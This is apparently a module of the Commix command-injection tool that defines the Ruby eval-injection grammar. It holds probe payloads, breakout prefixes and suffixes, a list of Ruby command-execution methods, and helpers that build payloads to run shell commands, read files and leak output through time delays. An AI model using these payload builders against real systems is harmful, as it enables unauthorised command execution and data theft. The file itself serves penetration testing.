#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

NAME = "ruby"

# The same name as it is written out to the user, where the switch's own spelling would read wrong.
LABEL = "Ruby"

"""
A constant whose value says at once that code was evaluated, and which build evaluated it.

RUBY_DESCRIPTION carries the same shape as Python's 'sys.version' - the version, a revision in
parentheses, the platform in brackets - so the one regex below reads either.
"""
PROBE = "RUBY_DESCRIPTION"

# The probe on its own, and coerced to a string where the bare constant is not rendered as one.
PROBE_FUNCTIONS = ["" + PROBE + "",
  PROBE + ".to_s",
  PROBE + ".inspect"
]

# The same probes broken into the string being evaluated, one boundary per row - each row pairing a
# prefix with the suffix that closes it, the way the boundaries below are paired.
PROBE_PAYLOADS = [
  [x for x in PROBE_FUNCTIONS],
  ["+" + x for x in PROBE_FUNCTIONS],
  ["'+" + x + "+'" for x in PROBE_FUNCTIONS],
  ["\"+" + x + "+\"" for x in PROBE_FUNCTIONS],
  ["')+" + x + "+('" for x in PROBE_FUNCTIONS]
]

PROBE_PAYLOADS = [x for payload in PROBE_PAYLOADS for x in payload]

# What the probe's own value looks like coming back, and the complaints that say a payload reached
# an evaluated string even where nothing was rendered.
PROBE_REGEX = r"(\d+\.\d+\.\d+[^\s\]]*)\s*\([^)]*\)\s*\[[^\]]+\]"
WARNINGS = ["(eval):", "SyntaxError", "NameError", "NoMethodError", "in `eval'"]

"""
The language's own methods that run a command, widest first as the level rises.

Each is written as a bare name a payload can wrap in a call - the backtick operator '`cmd`' runs a
command too, and is reached through 'run()' below rather than named here, since it is not a call this
prefix scheme can wrap.
"""
EXECUTION_FUNCTIONS_LVL1 = ["system", "exec"]
EXECUTION_FUNCTIONS_LVL2 = EXECUTION_FUNCTIONS_LVL1 + ["Kernel.system", "IO.popen"]
EXECUTION_FUNCTIONS_LVL3 = EXECUTION_FUNCTIONS_LVL2 + ["Open3.capture2", "Open3.capture3", "instance_eval"]

# Breaking out of the evaluated string, and closing it again behind the payload.
SEPARATORS_LVL1 = [""]
SEPARATORS_LVL2 = SEPARATORS_LVL1 + ["\n"]
SEPARATORS_LVL3 = SEPARATORS_LVL2 + ["\r\n"]

# The whole value as the expression, concatenation onto a value that is already one, and
# concatenation out of a quoted string the value sits inside.
PREFIXES_LVL1 = ["", "+", "'+", "\"+"]
# Closing a call the value sits inside, and a further argument to one.
PREFIXES_LVL2 = PREFIXES_LVL1 + ["')+", "\")+", "',", "\","]
# Ending the statement outright, where the sink runs statements rather than an expression.
PREFIXES_LVL3 = PREFIXES_LVL2 + ["';", "\";", ";", ")", "']", "\"]", "'}", "\"}"]

SUFFIXES_LVL1 = ["", "+'", "+\""]
# Closing the call again, and commenting out whatever the application appends behind it.
SUFFIXES_LVL2 = SUFFIXES_LVL1 + ["+('", "+(\"", "#"]
SUFFIXES_LVL3 = SUFFIXES_LVL2 + ["'#", "\"#", ")#", "]#", "}#", ",'", ",\""]

# How one of the functions above is reached, as a prefix a payload is wrapped in.
def execution_prefix(function):
  return function + "("

"""
Wrap the shell commands a payload runs in what this language renders them with.

There is no statement here that writes to the response the way another language's print does: what
the application renders is the value of the expression it evaluated, so the commands' output is
concatenated and handed back as that value.
"""
def print_statement(separator, commands, chain=None):
  if separator == "":
    return "+".join(run(command) for command in commands)
  return run((chain or separator).join(commands))

"""
The expressions every payload is built out of, spelled the way this language spells them.

What a technique asks of a sink is the same whichever language is evaluating: run this, tell me how
long the answer is, tell me its Nth byte, wait this long if the answer is yes. Only the spelling
differs - so the techniques ask through the names below, and a language is added by writing them
again rather than by touching a payload.
"""

# Run a command and yield its output, through the backtick operator - which reads a command the
# same way a double-quoted string reads its own text, so nothing here needs a separate literal form.
def run(cmd):
  return "`" + cmd + "`"

# Read a file and yield its contents.
def read_file(path):
  return run("cat " + path)

# Drop trailing whitespace, so a length agrees with what a shell's own substitution would report.
def trim(expr):
  return "(" + expr + ").rstrip"

# How many bytes an expression is.
def length(expr):
  return "(" + expr + ").length"

"""
The ordinal of an expression's Nth byte, counting from zero.

Indexed rather than sliced: a single index answers 'nil' past the end, where a slice would answer an
empty string instead - itself a valid one-character result at the boundary, and not distinguishable
from "out of range" the way 'nil' is.
"""
def ordinal(expr, index):
  return "((" + expr + ")[" + str(index) + "] || \"\\0\").ord"

# An expression's value read as a number, for a command whose output is one - 'nil.to_i' and
# '"".to_i' both answer 0, so nothing further has to guard against either.
def to_number(expr):
  return "(" + expr + ").to_i"

# Wait for as long as the condition is true, and no time at all when it is false. A ternary rather
# than multiplying the delay by the condition, the way another language's grammar does it here -
# 'true' and 'false' are not numbers in this one, and cannot be multiplied by anything.
def delay(timesec, condition):
  return "sleep((" + condition + ") ? " + str(timesec) + " : 0)"

"""
Stop the page where the condition does not hold, so what comes back says which it was.
"""
def halt(condition):
  # Empty string rather than a number: the value is spliced into whatever the target was building,
  # and only a string leaves that expression intact for the page to render as it normally would.
  return "((" + condition + ") ? \"\" : exit)"

"""
Evaluate one expression and then another, within a single expression.

Concatenation, the same trick the PHP grammar uses: the first expression here is always a command
whose own output was redirected to a file rather than captured, so what it evaluates to is empty,
and concatenating it onto the second leaves that second value exactly as it was.
"""
def sequence(first, second):
  return first + "+" + second

# What ends a statement, where the boundary being tested can carry one.
TERMINATOR = ";"

# eof
